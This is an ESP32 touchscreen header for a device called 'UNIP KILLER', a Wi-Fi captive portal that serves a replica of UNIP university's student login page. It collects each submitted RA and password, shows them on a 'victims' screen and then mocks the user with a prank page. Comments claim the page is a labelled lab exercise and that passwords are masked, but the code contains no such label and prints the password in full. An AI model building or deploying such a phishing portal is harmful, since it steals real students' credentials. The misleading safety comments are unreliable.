#pragma once
/*
 * UNIP KILLER / THE LAST SIGNAL — visual CYD 320 x 240.
 * Inclua no lugar do arquivo visual anterior, depois de declarar tft,
 * PORTAL_SSID, captureCount e lastUser. Nao inclua as duas versoes juntas.
 * Mantem as funcoes publicas do anexo. Nao requer logo.h, fontes externas,
 * sprites nem framebuffer. A fonte stencil usa somente 322 bytes de dados.
 * Paginas do laboratorio usam amostras fixas e identificam a simulacao.
 * O tratamento HTTP continua pertencendo ao sketch principal.
 */

#ifndef SLASHER_INTRO_ANIMATION
#define SLASHER_INTRO_ANIMATION 1
#endif

static const uint16_t SL_BLACK = 0x0841;  // #080808, preto de fita
static const uint16_t SL_BONE  = 0xEF1A;  // marfim envelhecido
static const uint16_t SL_RED   = 0xD8C3;  // vermelho sangue
static const uint16_t SL_DARK  = 0x3801;  // vinho profundo
static const uint16_t SL_MUTED = 0x9C71;
static const uint16_t SL_LINE  = 0x2945;
static const uint16_t SL_PANEL = 0x1082;

// Aliases preservados para o sketch que ja usa os nomes anteriores.
static const uint16_t NEON_GREEN = SL_RED, NEON_CYAN = SL_BONE;
static const uint16_t NEON_RED = SL_RED, DIM_GREY = SL_MUTED;
static const uint16_t PANEL_BG = SL_BLACK, NEON_PURPLE = SL_RED;
static const int HUD_X = 8, HUD_Y = 8, HUD_W = 304, HUD_H = 224;
static const int DOT_CX = 300, DOT_CY = 16, DOT_R = 3;
static const int CURSOR_X = 288, CURSOR_Y = 222, CURSOR_W = 8, CURSOR_H = 9;

// Bounds of the "back to waiting screen" button drawn on the capture screen
// (matches drawHudFrame's footer bar). The touchscreen isn't calibrated to
// screen pixels in this sketch, so a.ino's loop() doesn't hit-test against
// these -- it treats any touch while the capture screen is up as a tap on
// this button, same as the intro screen's "touch anywhere to start".
static const int BACK_BTN_X = 16, BACK_BTN_Y = 218, BACK_BTN_W = 288, BACK_BTN_H = 14;
bool portalShowingCapture = false;
uint16_t currentAccent = SL_RED;

// Cada byte e uma linha de 5 pixels. Fonte propria: sem LOAD_FONT2/4.
static const char slAlphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .:/-_#!?*";
static const uint8_t slGlyphs[][7] = {
 {14,17,17,31,17,17,17}, {30,17,17,30,17,17,30},
 {15,16,16,16,16,16,15}, {30,17,17,17,17,17,30},
 {31,16,16,30,16,16,31}, {31,16,16,30,16,16,16},
 {15,16,16,19,17,17,15}, {17,17,17,31,17,17,17},
 {31,4,4,4,4,4,31},    {7,2,2,2,18,18,12},
 {17,18,20,24,20,18,17},{16,16,16,16,16,16,31},
 {17,27,21,21,17,17,17},{17,25,25,21,19,19,17},
 {14,17,17,17,17,17,14},{30,17,17,30,16,16,16},
 {14,17,17,17,21,18,13},{30,17,17,30,20,18,17},
 {15,16,16,14,1,1,30}, {31,4,4,4,4,4,4},
 {17,17,17,17,17,17,14},{17,17,17,17,17,10,4},
 {17,17,17,21,21,27,17},{17,17,10,4,10,17,17},
 {17,17,10,4,4,4,4},   {31,1,2,4,8,16,31},
 {14,17,19,21,25,17,14},{4,12,4,4,4,4,14},
 {14,17,1,2,4,8,31},   {30,1,1,14,1,1,30},
 {2,6,10,18,31,2,2},   {31,16,16,30,1,1,30},
 {14,16,16,30,17,17,14},{31,1,2,4,8,8,8},
 {14,17,17,14,17,17,14},{14,17,17,15,1,1,14},
 {0,0,0,0,0,0,0},     {0,0,0,0,0,6,6},
 {0,6,6,0,6,6,0},     {1,2,2,4,8,8,16},
 {0,0,0,31,0,0,0},    {0,0,0,0,0,0,31},
 {10,10,31,10,31,10,10},{4,4,4,4,4,0,4},
 {14,17,1,2,4,0,4},   {0,21,14,31,14,21,0}
};

static const uint8_t *slGlyph(char c) {
  if (c >= 'a' && c <= 'z') c -= ('a' - 'A');
  for (unsigned int i = 0; i < sizeof(slAlphabet) - 1; ++i)
    if (slAlphabet[i] == c) return slGlyphs[i];
  return slGlyphs[44]; // ?
}

// Texto recortado pela largura; agrupa pixels vizinhos para reduzir SPI.
// reveal permite a entrada diagonal sem reservar um framebuffer.
static void slText(const char *s, int x, int y, uint16_t color,
                   int sx = 1, int sy = 1, int maxWidth = 288,
                   int lean = 0, int reveal = 1000) {
  int pen = 0;
  while (*s && pen + 5 * sx + lean <= maxWidth) {
    unsigned char c = static_cast<unsigned char>(*s++);
    if ((c & 0xC0) == 0x80) continue; // nao multiplica bytes UTF-8
    const uint8_t *g = slGlyph(static_cast<char>(c));
    for (int row = 0; row < 7; ++row) {
      int skew = lean * (6 - row) / 6;
      for (int col = 0; col < 5;) {
        if (!(g[row] & (16 >> col))) { ++col; continue; }
        int start = col;
        while (col < 5 && (g[row] & (16 >> col))) ++col;
        int px = x + pen + start * sx + skew;
        int py = y + row * sy;
        int w = (col - start) * sx;
        int edge = reveal - py / 2 - px;
        if (edge <= 0) continue;
        if (edge < w) w = edge;
        tft.fillRect(px, py, w, sy, color);
      }
    }
    pen += 6 * sx;
  }
}

static void slRule(int y, uint16_t c = SL_LINE) {
  tft.drawFastHLine(16, y, 288, c);
}

static void slBackground() {
  tft.fillScreen(SL_BLACK);
  // Dois cortes largos formam uma borda assimetrica, atras do conteudo.
  tft.fillTriangle(272, 0, 319, 0, 205, 240, SL_DARK);
  tft.fillTriangle(319, 0, 319, 66, 205, 240, SL_DARK);
  tft.fillTriangle(304, 0, 316, 0, 220, 196, SL_RED);
  for (int y = 3; y < 240; y += 5)
    tft.drawFastHLine(0, y, 320, SL_BLACK);
  // Arranhoes deterministas: sem flicker aleatorio no loop.
  for (int i = 0; i < 28; ++i) {
    int x = (i * 73 + 11) % 320, y = (i * 47 + 31) % 240;
    tft.drawFastHLine(x, y, 2 + i % 6, SL_LINE);
  }
  tft.drawFastHLine(8, 8, 22, SL_RED);
  tft.drawFastVLine(8, 8, 20, SL_RED);
  tft.drawFastHLine(290, 231, 22, SL_RED);
  tft.drawFastVLine(311, 211, 20, SL_RED);
}

static void slCard(int x, int y, int w, int h) {
  tft.fillRect(x, y, w, h, SL_PANEL);
  tft.drawFastHLine(x, y, w, SL_LINE);
  tft.fillRect(x, y, 3, h, SL_RED);
}

static void slIntroType(int reveal = 1000) {
  slText("UNIP", 24, 57, SL_BONE, 6, 6, 264, 8, reveal);
  slText("KILLER", 17, 107, SL_DARK, 8, 11, 292, 10, reveal);
  slText("KILLER", 14, 103, SL_RED, 8, 11, 292, 10, reveal);
}

void showIntro() {
  slBackground();
  slText("VOL.01", 260, 19, SL_BONE, 1, 1, 44);
  slRule(36);
#if SLASHER_INTRO_ANIMATION
  for (int edge = 40; edge <= 430; edge += 26) {
    slIntroType(edge);
    delay(12); // so no inicio, nunca no loop de atendimento do portal
  }
#endif
  slIntroType();
  // Corte seco que atravessa a tipografia; sem flash de tela cheia.
  tft.fillTriangle(34, 178, 286, 105, 60, 176, SL_BLACK);
  tft.drawLine(34, 178, 286, 105, SL_BONE);
  tft.fillRect(53, 117, 5, 2, SL_BLACK);
  tft.fillRect(173, 145, 11, 2, SL_BLACK);
  slText("NINGUEM SAI DA MESMA FORMA.", 20, 193, SL_MUTED);
  tft.fillRect(16, 215, 288, 18, SL_RED);
  slText("TOQUE PARA INICIAR", 59, 221, SL_BONE);
  tft.fillTriangle(283, 220, 288, 224, 283, 228, SL_BONE);
}

// Wi-Fi angular: ecoa os cortes do titulo, sem fontes/icones externos.
void drawWifiIcon(int cx, int cy, uint16_t color) {
  tft.fillCircle(cx, cy, 5, color);
  for (int n = 1; n <= 3; ++n) {
    int r = 16 + n * 16;
    for (int k = 0; k < 4; ++k) {
      tft.drawLine(cx - r, cy - r / 2 - k, cx, cy - r - k, color);
      tft.drawLine(cx, cy - r - k, cx + r, cy - r / 2 - k, color);
    }
  }
}

void showWifiScreen() {
  slBackground();
  slText("UNIP KILLER / FREQUENCIA", 18, 18, SL_MUTED);
  slRule(35);
  drawWifiIcon(160, 140, SL_RED);
  slText("SINTONIZANDO", 53, 165, SL_BONE, 3, 3, 250);
  slText("NINGUEM ESTA SEGURO.", 85, 198, SL_MUTED);
  slRule(218);
}

void drawSignalBars(int x, int y, int rssi) {
  int level = rssi >= -55 ? 4 : rssi >= -65 ? 3 : rssi >= -75 ? 2 : rssi >= -85 ? 1 : 0;
  for (int i = 0; i < 4; ++i) {
    int h = 4 + i * 3;
    tft.fillRect(x + i * 6, y - h, 4, h, i < level ? SL_BONE : SL_LINE);
  }
}

void drawHudFrame(const char *title, uint16_t accent) {
  currentAccent = accent;
  slBackground();
  // Fundo opaco na faixa: o blink apaga exatamente a mesma cor.
  tft.fillRect(15, 10, 291, 15, SL_BLACK);
  slText(title, 18, 13, SL_MUTED, 1, 1, 264);
  tft.fillCircle(DOT_CX, DOT_CY, DOT_R, accent);
  slRule(29);
  slRule(214);
  tft.fillRect(16, 218, 288, 14, SL_BLACK);
}

void setLiveDot(bool on) {
  tft.fillCircle(DOT_CX, DOT_CY, DOT_R, on ? currentAccent : PANEL_BG);
}

void setCursorBlock(bool on) {
  tft.fillRect(CURSOR_X, CURSOR_Y, CURSOR_W, CURSOR_H, on ? SL_RED : SL_BLACK);
}

void showPortalStatus(IPAddress ip) {
  portalShowingCapture = false;
  drawHudFrame("UNIP KILLER / NO AR", SL_RED);
  slText("A ESPERA", 17, 45, SL_BONE, 4, 5, 280, 3);

  slCard(16, 108, 190, 98);
  slText("01 / FREQUENCIA", 26, 118, SL_MUTED);
  slText(String(PORTAL_SSID).c_str(), 26, 134, SL_BONE, 1, 2, 170);
  tft.drawFastHLine(26, 158, 170, SL_LINE);
  slText("02 / ENDERECO", 26, 168, SL_MUTED);
  slText(ip.toString().c_str(), 26, 184, SL_BONE, 1, 2, 170);

  slCard(214, 108, 90, 98);
  slText("VITIMAS", 228, 119, SL_MUTED);
  // 4 algarismos cabem; evita invadir a borda em contadores grandes.
  String takes = String(captureCount);
  if (takes.length() > 4) takes = "9999";
  slText(takes.c_str(), 228, 140, SL_BONE, 3, 5, 72);
  slText("REGISTROS", 228, 189, SL_MUTED, 1, 1, 66);
  slText("AGUARDANDO VITIMA", 18, 224, SL_MUTED);
  setCursorBlock(true);
}

void showPortalCapture() {
  portalShowingCapture = true;
  drawHudFrame("UNIP KILLER / REGISTRO", SL_RED);
  slText("REGISTRADO", 17, 44, SL_BONE, 4, 5, 286, 3);
  slText("MAIS UM TAKE PARA A FITA.", 18, 88, SL_MUTED);

  slCard(16, 107, 288, 45);
  slText("RA", 26, 115, SL_MUTED);
  slText(lastUser.c_str(), 26, 130, SL_BONE, 2, 2, 265);
  slCard(16, 159, 288, 45);
  slText("SENHA", 26, 167, SL_MUTED);
  // Mascara fixa: nao revela conteudo nem tamanho de nenhuma senha.
  slText(lastPass.c_str(), 26, 182, SL_RED, 2, 2, 265);

  // Tappable footer bar: a touch inside BACK_BTN_* (checked in a.ino's
  // loop()) returns to showPortalStatus(), which redraws with the
  // now-updated capture counter.
  slText("TOQUE PARA VOLTAR", BACK_BTN_X + 2, BACK_BTN_Y + 3, SL_BONE);
  slText(String(captureCount).c_str(), 270, BACK_BTN_Y + 3, SL_MUTED, 1, 1, 34);
}

// The login page. Framed explicitly as an educational lab and asking for a
// FICTITIOUS username, with a reminder not to enter real credentials.
String loginPageHtml() {
  return R"HTML(<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{margin:0;background:#fff;color:#111;font-family:Arial,sans-serif}
.hero{
  height:329px;padding:28px 28px 40px;text-align:center;color:#fff;
  background:linear-gradient(120deg,#014AA7,#014AA7);
  border-radius:0 0 50% 50% / 0 0 8% 8%;position:relative
}
.demo{position:absolute;right:16px;top:8px;font-size:12px}
.logo-img{display:block;margin:0 auto 20px;max-width:260px;width:100%;height:auto}
.hero h2{font-size:24px;line-height:1.2;margin:0 0 12px}
.hero strong{display:block;font-size:15px;line-height:1.3}
.hero p{font-size:13px;line-height:1.5;margin:8px 0 20px}
.dots{display:flex;justify-content:center;gap:8px}
.dots span{width:15px;height:15px;background:#ffffff60;border-radius:50%}
.dots span.active{background:#fff}
.dots span{transition:background .3s}
.slide{transition:opacity .3s}
.slide.fade{opacity:0}
main{max-width:488px;margin:auto;padding:46px 29px 24px}
h1{margin:0;color:#014AA7;font-size:28px;letter-spacing:-.5px}
.sub{margin:8px 0 34px;color:#777;font-size:15px}
.field{
  display:block;position:relative;margin-bottom:31px;
  border:1px solid #199d69;border-radius:8px;background:#fff;
  box-shadow:0 0 0 3px #edf2ef;overflow:hidden
}
.field span{
  position:absolute;left:13px;top:9px;font-size:10px;
  font-weight:bold;letter-spacing:.5px;color:#617080
}
input{
  display:block;width:100%;height:57px;padding:22px 16px 8px;
  border:0;background:transparent;font:16px Arial;color:#111
}
.field:focus-within{outline:2px solid #014AA7;outline-offset:3px}
input:focus{outline:none}
.enter{
  width:100%;height:50px;margin-top:5px;border:0;border-radius:7px;
  background:#014AA7;color:#fff;font-size:16px;font-weight:bold;
  cursor:pointer
}
.divider{
  display:flex;align-items:center;gap:12px;
  margin:22px 0 17px;color:#718098;font-size:12px
}
.divider:before,.divider:after{content:"";height:1px;background:#dbe1e9;flex:1}
.microsoft{
  display:flex;align-items:center;justify-content:center;gap:10px;
  width:100%;min-height:50px;border:1px solid #c5cedc;
  border-radius:7px;background:#fff;color:#111;
  font-size:15px;font-weight:bold;cursor:pointer
}
.ms{
  width:18px;height:18px;display:grid;
  grid-template-columns:1fr 1fr;gap:1px
}
.ms i:nth-child(1){background:#f35325}
.ms i:nth-child(2){background:#81bc06}
.ms i:nth-child(3){background:#014AA7}
.ms i:nth-child(4){background:#ffba08}
.hint{margin:12px 0 34px;text-align:center;font-size:12px;color:#718098}
.links{display:flex;justify-content:center;flex-wrap:wrap;gap:12px}
.links button{
  padding:8px 10px;border:1px solid #014AA7;border-radius:5px;
  background:#fff;color:#014AA7;font-size:13px;cursor:pointer
}
.links button:first-child{font-weight:bold}
button:focus-visible{outline:2px solid #014AA7;outline-offset:3px}
.notice{color:#777;text-align:center;font-size:11px;margin:22px 0 0}
@media(min-width:700px){
  .hero{height:329px}
  .hero strong,.hero p{max-width:440px;margin-left:auto;margin-right:auto}
}
</style>
</head>
<body>
<header class="hero">
<img class="logo-img" src="/logo.png" alt="UNIP">
<div class="slide" id="slide">
<h2 id="s-title">Ensino de Excelência</h2>
<strong id="s-sub">Professores altamente qualificados e metodologias inovadoras de aprendizados.</strong>
<p id="s-desc">Graduação, pós-graduação e extensão com qualidade reconhecida pelo MEC</p>
</div>
<div class="dots" aria-hidden="true">
<span class="active"></span><span></span><span></span>
</div>
</header>

<script>
(function(){
var S=[
["Ensino de Excelência","Professores altamente qualificados e metodologias inovadoras de aprendizados.","Graduação, pós-graduação e extensão com qualidade reconhecida pelo MEC"],
["Estude Onde Estiver","Aulas online e presenciais com flexibilidade para a sua rotina.","Acesse materiais, provas e notas de qualquer dispositivo"],
["Prepare-se para o Mercado","Cursos alinhados às demandas das empresas e às novas tecnologias.","Estágios, parcerias e projetos práticos durante toda a formação"]
],
g=function(id){return document.getElementById(id)},
b=g("slide"),t=g("s-title"),s=g("s-sub"),d=g("s-desc"),
p=document.querySelector(".dots").getElementsByTagName("span"),
i=0;
setInterval(function(){
i=(i+1)%S.length;
b.className="slide fade";
setTimeout(function(){
t.innerHTML=S[i][0];s.innerHTML=S[i][1];d.innerHTML=S[i][2];
for(var n=0;n<p.length;n++)p[n].className=n==i?"active":"";
b.className="slide";
},300);
},3500);
})();
</script>

<main>
  <form class="card" method="POST" action="/login">
  <h1>Área do(a) Aluno(a)</h1>
  <p class="sub">Acesse seu ambiente acadêmico</p>

  <label class="field">
    <span>RA (NÚMERO DE MATRÍCULA)</span>
    <input type="text"autocomplete="off" id="user" name="user" required>
  </label>

  <label class="field">
    <span>SENHA</span>
    <input type="password" autocomplete="off" id="pass" name="pass" required>
  </label>

  <button class="enter" type="submit">Entrar</button>
  <form>

  <div class="divider">OU</div>

  <button class="microsoft" type="button">
    <span class="ms" aria-hidden="true">
      <i></i><i></i><i></i><i></i>
    </span>
    Entrar com a conta Microsoft
  </button>

  <p class="hint">Use seu e-mail institucional (@aluno.unip.br).</p>

  <div class="links">
    <button type="button">Esqueceu a senha?</button>
    <button type="button">Como acessar</button>
  </div>
</main>
</body>
</html>)HTML";
}

// Confirmation page shown after a submission.
String resultPageHtml(const String &user) {
  String html =R"HTML(<!DOCTYPE html>
<html lang="pt-br"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>TE PEGUEI</title>
<style>
  @keyframes bg { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
  @keyframes shake { 0%,100%{transform:translate(0,0) rotate(-2deg)} 25%{transform:translate(-4px,2px) rotate(2deg)}
                     50%{transform:translate(4px,-2px) rotate(-3deg)} 75%{transform:translate(-2px,3px) rotate(3deg)} }
  @keyframes spin { to{transform:rotate(360deg)} }
  @keyframes pop { 0%{transform:scale(0.6);opacity:0} 100%{transform:scale(1);opacity:1} }
  body { margin:0; font-family: system-ui, sans-serif; color:#fff; overflow:hidden;
         background:linear-gradient(135deg,#ff0055,#ff8800,#ffee00,#00ffaa,#aa00ff);
         background-size:400% 400%; animation:bg 6s ease infinite;
         display:flex; min-height:100vh; align-items:center; justify-content:center; text-align:center; }
  .card { width:90%; max-width:420px; background:rgba(0,0,0,.78); padding:36px 24px; border-radius:20px;
          box-shadow:0 0 40px rgba(0,0,0,.6); animation:pop .4s ease; }
  .emoji { font-size:64px; display:inline-block; animation:spin 2s linear infinite; }
  h1 { color:#4ade80; font-size:30px; margin:14px 0 6px; animation:shake .3s infinite; }
  .sub { font-size:17px; color:#ffde59; margin:4px 0; }
  .fake { font-size:12px; color:#ff6b6b; margin-top:18px; font-family:monospace; line-height:1.6; }
  a { display:inline-block; margin-top:22px; color:#38bdf8; text-decoration:none; border:1px solid #38bdf8;
      padding:8px 18px; border-radius:8px; }
  a:hover { background:#38bdf8; color:#000; }
</style></head>
<body>
  <div class="card">
    <span class="emoji">🤡</span>
    <h1><br>AHAHAHAHAHAHHA</h1>
    <div class="fake">
      > rastreando localizacao....... OK<br>
      > acessando webcam............. OK<br>
      > baixando historico........... OK<br>
      > enviando 400 conto para mim.. OK<br>
      > enviando dados para russos... OK<br>
    </div>
  </div>
</body></html>)HTML";
  return html;
}
